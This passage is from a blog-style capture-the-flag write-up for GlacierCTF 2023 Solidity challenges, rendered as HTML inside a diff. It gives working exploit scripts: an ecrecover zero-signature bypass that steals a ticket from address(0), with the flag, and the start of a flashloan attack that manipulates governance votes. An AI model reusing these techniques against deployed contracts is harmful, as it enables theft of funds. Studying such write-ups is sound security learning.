+        <span class="nf">_transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nf">_checkOnERC721Received</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">_data</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Ticket: transfer to non ERC721Receiver implementer</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">_checkOnERC721Received</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_data</span><span class="p">)</span> <span class="nx">internal</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">if </span><span class="p">(</span><span class="nf">_isContract</span><span class="p">(</span><span class="nx">to</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">try</span> <span class="nc">IERC721Receiver</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nf">onERC721Received</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">_data</span><span class="p">)</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bytes4</span> <span class="nx">retval</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nx">retval</span> <span class="o">==</span> <span class="nc">IERC721Receiver</span><span class="p">(</span><span class="nx">to</span><span class="p">).</span><span class="nx">onERC721Received</span><span class="p">.</span><span class="nx">selector</span><span class="p">;</span>
+            <span class="p">}</span> <span class="nf">catch </span><span class="p">(</span><span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">reason</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nf">if </span><span class="p">(</span><span class="nx">reason</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nf">revert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Ticket: transfer to non ERC721Receiver implementer</span><span class="dl">"</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nx">assembly</span> <span class="p">{</span>
+                        <span class="nf">revert</span><span class="p">(</span><span class="nf">add</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="nx">reason</span><span class="p">),</span> <span class="nf">mload</span><span class="p">(</span><span class="nx">reason</span><span class="p">))</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">_isApprovedOrOwner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">spender</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="nx">internal</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">_owners</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span> <span class="o">!=</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="dl">"</span><span class="s2">Ticket: operator query for nonexistent token</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">address</span> <span class="nx">_owner</span> <span class="o">=</span> <span class="nf">ownerOf</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">);</span>
+        <span class="nf">return </span><span class="p">(</span><span class="nx">spender</span> <span class="o">==</span> <span class="nx">_owner</span> <span class="o">||</span> <span class="nf">getApproved</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">)</span> <span class="o">==</span> <span class="nx">spender</span> <span class="o">||</span> <span class="nf">isApprovedForAll</span><span class="p">(</span><span class="nx">_owner</span><span class="p">,</span> <span class="nx">spender</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">_approve</span><span class="p">(</span><span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">)</span> <span class="nx">internal</span> <span class="p">{</span>
+        <span class="nx">_tokenApprovals</span><span class="p">[</span><span class="nx">tokenId</span><span class="p">]</span> <span class="o">=</span> <span class="nx">to</span><span class="p">;</span>
+        <span class="nx">emit</span> <span class="nc">Approval</span><span class="p">(</span><span class="nf">ownerOf</span><span class="p">(</span><span class="nx">tokenId</span><span class="p">),</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">_getChainId</span><span class="p">()</span> <span class="nx">internal</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">chainId</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">assembly</span> <span class="p">{</span>
+            <span class="nl">chainId</span> <span class="p">:</span><span class="o">=</span> <span class="nf">chainid</span><span class="p">()</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">_getDomainSeparator</span><span class="p">()</span> <span class="kr">private</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span>
+            <span class="nx">DOMAIN_SEPARATOR_TYPEHASH</span><span class="p">,</span>
+            <span class="nf">keccak256</span><span class="p">(</span><span class="nf">bytes</span><span class="p">(</span><span class="nx">_name</span><span class="p">)),</span>
+            <span class="nf">keccak256</span><span class="p">(</span><span class="nf">bytes</span><span class="p">(</span><span class="dl">"</span><span class="s2">1</span><span class="dl">"</span><span class="p">)),</span>
+            <span class="nf">_getChainId</span><span class="p">(),</span>
+            <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">)</span>
+        <span class="p">));</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">_isContract</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_addr</span><span class="p">)</span> <span class="kr">private</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">){</span>
+        <span class="nx">uint32</span> <span class="nx">size</span><span class="p">;</span>
+        <span class="nx">assembly</span> <span class="p">{</span>
+            <span class="nl">size</span> <span class="p">:</span><span class="o">=</span> <span class="nf">extcodesize</span><span class="p">(</span><span class="nx">_addr</span><span class="p">)</span>
+        <span class="p">}</span>
+        <span class="nf">return </span><span class="p">(</span><span class="nx">size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kr">interface</span> <span class="nx">IERC721Receiver</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nf">onERC721Received</span><span class="p">(</span><span class="nx">address</span> <span class="nx">operator</span><span class="p">,</span> <span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">data</span><span class="p">)</span> <span class="nx">external</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bytes4</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Observations :</p>
+
+<ol>
+  <li>Setup contract deploys ChairLift contract and updates tripsTaken to 1</li>
+  <li>ChairLift contract deploys and uses Ticket contract</li>
+  <li>Ticket contract is not a standard token contract</li>
+  <li>Ticket contract uses <code class="language-plaintext highlighter-rouge">ecrecover</code> to verify the signature</li>
+</ol>
+
+<p>Goal :</p>
+
+<ul>
+  <li>Goal is to update the tripsTaken variable to 2</li>
+</ul>
+
+<p>To update the tripsTaken we have to call the function <code class="language-plaintext highlighter-rouge">takeRide()</code> with a ticket Id as arguement.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">takeRide</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">ticketId</span><span class="p">)</span> <span class="nx">external</span>
+<span class="p">{</span>
+    <span class="nf">require </span><span class="p">(</span><span class="nx">ticket</span><span class="p">.</span><span class="nf">ownerOf</span><span class="p">(</span><span class="nx">ticketId</span><span class="p">)</span> <span class="o">==</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You don't own this ticket</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">tripsTaken</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="nx">ticket</span><span class="p">.</span><span class="nf">burn</span><span class="p">(</span><span class="nx">ticketId</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To call the takeRide function we need a ticket. To buy a ticket it costs 1 million ether, too expensive ride. So we need find a way to steal ticket.</p>
+
+<p>There is an interesting function <code class="language-plaintext highlighter-rouge">transferWithPermit()</code> which uses ecrecover to verify signature.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">transferWithPermit</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">deadline</span><span class="p">,</span> <span class="nx">uint8</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">bytes32</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">bytes32</span> <span class="nx">s</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+    <span class="nf">require</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">&lt;=</span> <span class="nx">deadline</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: permit expired</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">bytes32</span> <span class="nx">digest</span> <span class="o">=</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodePacked</span><span class="p">(</span><span class="dl">"</span><span class="se">\</span><span class="s2">x19</span><span class="se">\</span><span class="s2">x01</span><span class="dl">"</span><span class="p">,</span> <span class="nf">_getDomainSeparator</span><span class="p">(),</span> <span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">PERMIT_TYPEHASH</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">,</span> <span class="nx">nonces</span><span class="p">[</span><span class="k">from</span><span class="p">]</span><span class="o">++</span><span class="p">,</span> <span class="nx">deadline</span><span class="p">))));</span>
+    <span class="nx">address</span> <span class="nx">signer</span> <span class="o">=</span> <span class="nf">ecrecover</span><span class="p">(</span><span class="nx">digest</span><span class="p">,</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">r</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
+    <span class="nf">require</span><span class="p">(</span><span class="nx">signer</span> <span class="o">==</span> <span class="k">from</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Ticket: invalid permit</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nf">_transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">tokenId</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can transfer ticket to an address if we have the signature of a ticket owner. We cant get the signature of someone. Lets see who are the owners of some tickets.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mapping </span><span class="p">(</span><span class="nx">uint256</span> <span class="o">=&gt;</span> <span class="nx">address</span><span class="p">)</span> <span class="kr">private</span> <span class="nx">_owners</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Here we know that the default owner of a ticket is <code class="language-plaintext highlighter-rouge">0</code> address. In the <code class="language-plaintext highlighter-rouge">burn()</code> function also updates the owner of the ticket to <code class="language-plaintext highlighter-rouge">address(0)</code>. So, If we managed to get the signature of the <code class="language-plaintext highlighter-rouge">address(0)</code> and set the from address to <code class="language-plaintext highlighter-rouge">0</code> as the from address check is not done inside the transferWithPermit() function.</p>
+
+<p>By simply researching about ecrecover we can get to know that values of <code class="language-plaintext highlighter-rouge">v - 0, r - 0, s - 0</code> will recover the address of <code class="language-plaintext highlighter-rouge">0</code>. Now passing the from address as 0, signature values as 0 will bypass the signature check and transfers a ticket to our specified address. Then simply calling takeRide function will increment the tripsTaken variable.</p>
+
+<p><code class="language-plaintext highlighter-rouge">ChairLiftAttack.s.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="p">{</span><span class="nx">Ticket</span><span class="p">}</span> <span class="k">from</span>  <span class="dl">"</span><span class="s2">../src/ChairLift/Ticket.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">ChairLift</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/ChairLift/ChairLift.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/ChairLift/Setup.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">AttackScript</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
+    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
+        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nf">exploit</span><span class="p">();</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attack Success</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
+    <span class="nx">Setup</span> <span class="kr">public</span> <span class="nx">setupContract</span> <span class="o">=</span> <span class="nc">Setup</span><span class="p">(</span><span class="mh">0xB09c4177c15f9C5d4F6a8f1Bfa06cF4b77907Ff7</span><span class="p">);</span>
+    <span class="nx">ChairLift</span> <span class="kr">public</span> <span class="nx">chairlift</span> <span class="o">=</span> <span class="nc">ChairLift</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">setupContract</span><span class="p">.</span><span class="nc">TARGET</span><span class="p">()));</span>
+    <span class="nx">Ticket</span> <span class="kr">public</span> <span class="nx">ticket</span> <span class="o">=</span> <span class="nc">Ticket</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">chairlift</span><span class="p">.</span><span class="nf">ticket</span><span class="p">()));</span>
+
+    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">ticket</span><span class="p">.</span><span class="nf">transferWithPermit</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="o">+</span><span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nx">chairlift</span><span class="p">.</span><span class="nf">takeRide</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">//gctf{Y0u_d1d_1t!_Y0u_r34ch3d_th3_p34k!}</span>
+</code></pre></div></div>
+
+<p>To solve the challenge run the following command</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge script script/ChairLiftAttack.s.sol:AttackScript <span class="nt">--rpc-url</span> &lt;RPC-URL&gt; <span class="nt">--private-key</span> &lt;REDACTED&gt; <span class="nt">--broadcast</span>
+</code></pre></div></div>
+
+<h2 id="the-concil-of-apes-456pts">The Concil of Apes [456pts]</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Description : 
+
+On top of the glacier you run into a bunch of monkeys. They are screaching at each other, throwin feces around and won't let you pass. You will need to somehow get rid of them to finish your mission.
+
+author: J4X
+
+nc chall.glacierctf.com 13380
+
+</code></pre></div></div>
+
+<p>Attached files</p>
+
+<ol>
+  <li><a href="https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/Setup.sol" target="_blank">Setup.sol</a></li>
+  <li><a href="https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/CouncilOfApes.sol" target="_blank">CouncilOfApes.sol</a></li>
+  <li><a href="https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/IcyExchange.sol" target="_blank">IcyExchange.sol</a></li>
+  <li><a href="https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/IcyPool.sol" target="_blank">IcyPool.sol</a></li>
+  <li><a href="https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/TotallyNotCopiedToken.sol" target="_blank">TotallyNotCopiedToken.sol</a></li>
+  <li><a href="https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/IERC20.sol" target="_blank">IERC20.sol</a></li>
+  <li><a href="https://github.com/TheMj0ln1r/GlacierCTF23Solves/blob/main/src/CouncilOfApes/ERC20.sol" target="_blank">ERC20.sol</a></li>
+</ol>
+
+<p>This was an interesting and a bit of hard chall I would say, It took me more than an half day to understand the code base and solve the challenge.</p>
+
+<p>To solve the challenge we need to understand the entire code base, how the tokens are deployed, what is our goal, etc.</p>
+
+<p>At an high level our goal is to call the <code class="language-plaintext highlighter-rouge">dissolveCouncilOfTheApes()</code> function of <code class="language-plaintext highlighter-rouge">CouncilOfApes</code> contract. To call this function we need to upgrade our user class from <code class="language-plaintext highlighter-rouge">APE</code> to <code class="language-plaintext highlighter-rouge">GORILLA</code>. For this we should have more than <code class="language-plaintext highlighter-rouge">1_000_000_000</code> votes. An <code class="language-plaintext highlighter-rouge">APE</code> can vote it self with the <code class="language-plaintext highlighter-rouge">balanaBalance</code>. To get <code class="language-plaintext highlighter-rouge">1_000_000_000</code> votes we should have <code class="language-plaintext highlighter-rouge">1_000_000_000</code> bananabalance, but we only have 1.</p>
+
+<p>To get more bananaBalance we should exchange our <code class="language-plaintext highlighter-rouge">IcyTokens</code>, But we dont have them. We can get the <code class="language-plaintext highlighter-rouge">FlashLoan</code> of <code class="language-plaintext highlighter-rouge">IcyTokens</code>. To get pass the checks in FlashLoan function we should deploy our own Token with totalSupply less than <code class="language-plaintext highlighter-rouge">100_000_000</code>. And we need to create pool on <code class="language-plaintext highlighter-rouge">IcyExchange</code> contract.</p>
+
+<p>After creating a fake custom token and creating a pool we can able to get a FlashLoan of required amount. Then I took flashloan and used those IcyTokens to buy bananaBalance and voted my self to update the class to GORILLA from APE. Then there is way to mint more bananaBalance using <code class="language-plaintext highlighter-rouge">issueBanana()</code> function then I used <code class="language-plaintext highlighter-rouge">sell()</code> to exchange bananaBalance with <code class="language-plaintext highlighter-rouge">IcyTokens</code> and I repayed those tokens back to IcyExchange cause I took flashloan from it.</p>
+
+<p><code class="language-plaintext highlighter-rouge">MyNewToken.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">"</span><span class="s2">../../src/CouncilOfApes/ERC20.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">MyNewToken</span> <span class="nx">is</span> <span class="nx">ERC20</span> 
+<span class="p">{</span>
+    <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">symbol</span><span class="p">)</span> <span class="nc">ERC20</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">symbol</span><span class="p">)</span> 
+    <span class="p">{</span>
+        <span class="nf">_mint</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span> <span class="mi">100</span><span class="nx">_000_000</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">CouncilOfCapesAttack.s.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">"</span><span class="s2">./MyNewToken.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">IcyExchange</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../../src/CouncilOfApes/IcyExchange.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../../src/CouncilOfApes/Setup.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">AttackScript</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
+    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
+        <span class="k">new</span> <span class="nx">Attack</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">10</span> <span class="nx">ether</span><span class="p">}().</span><span class="nf">exploit</span><span class="p">();</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attack Success</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
+    <span class="nx">MyNewToken</span> <span class="kr">public</span> <span class="nx">myToken</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MyNewToken</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="dl">"</span><span class="s2">My New H4ck3r Token</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">H4CK</span><span class="dl">"</span><span class="p">);</span>
+    <span class="nx">Setup</span> <span class="kr">public</span> <span class="nx">setup</span> <span class="o">=</span> <span class="nc">Setup</span><span class="p">(</span><span class="mh">0x821B54EfB659A64d5b0A3145811b290A997705C0</span><span class="p">);</span>
+    <span class="nx">IcyExchange</span> <span class="kr">public</span> <span class="nx">TARGET</span> <span class="o">=</span> <span class="nx">setup</span><span class="p">.</span><span class="nc">TARGET</span><span class="p">();</span>
+    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">_icyToken</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">.</span><span class="nf">icyToken</span><span class="p">());</span>
+
+    <span class="nx">bytes32</span> <span class="kr">public</span> <span class="nx">theEvilWords</span> <span class="o">=</span> <span class="nf">keccak256</span><span class="p">(</span><span class="dl">"</span><span class="s2">Kevin come out of the basement, dinner is ready.</span><span class="dl">"</span><span class="p">);</span>
+
+    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span><span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mi">10</span> <span class="nx">ether</span><span class="p">);</span>
+    <span class="p">}</span>
+
+
+    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        
+        <span class="c1">//Become an ape</span>
+        <span class="nx">bytes32</span> <span class="nx">holyWords</span> <span class="o">=</span> <span class="nf">keccak256</span><span class="p">(</span><span class="dl">"</span><span class="s2">I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">council</span><span class="p">().</span><span class="nf">becomeAnApe</span><span class="p">(</span><span class="nx">holyWords</span><span class="p">);</span>
+
+    
+        <span class="c1">// create a pool on IcyExchange</span>
+        <span class="nx">myToken</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">),</span> <span class="mi">100</span><span class="nx">_000</span><span class="p">);</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nx">createPool</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">ether</span><span class="p">}(</span><span class="nf">address</span><span class="p">(</span><span class="nx">myToken</span><span class="p">));</span>
+
+        <span class="c1">// Take flash loan</span>
+        <span class="nx">myToken</span><span class="p">.</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">),</span> <span class="nf">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span> <span class="c1">// we dont know how many tokens it needs, give as much as possible</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">collateralizedFlashloan</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">myToken</span><span class="p">),</span> <span class="mi">1</span><span class="nx">_000_000_000</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">receiveFlashLoan</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">icyToken</span><span class="p">().</span><span class="nf">approve</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">.</span><span class="nf">council</span><span class="p">()),</span> <span class="nx">amount</span><span class="p">);</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">council</span><span class="p">().</span><span class="nf">buyBanana</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
+
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">council</span><span class="p">().</span><span class="nf">vote</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">amount</span><span class="p">);</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">council</span><span class="p">().</span><span class="nf">claimNewRank</span><span class="p">();</span>
+        
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">council</span><span class="p">().</span><span class="nf">issueBanana</span><span class="p">(</span><span class="nx">amount</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
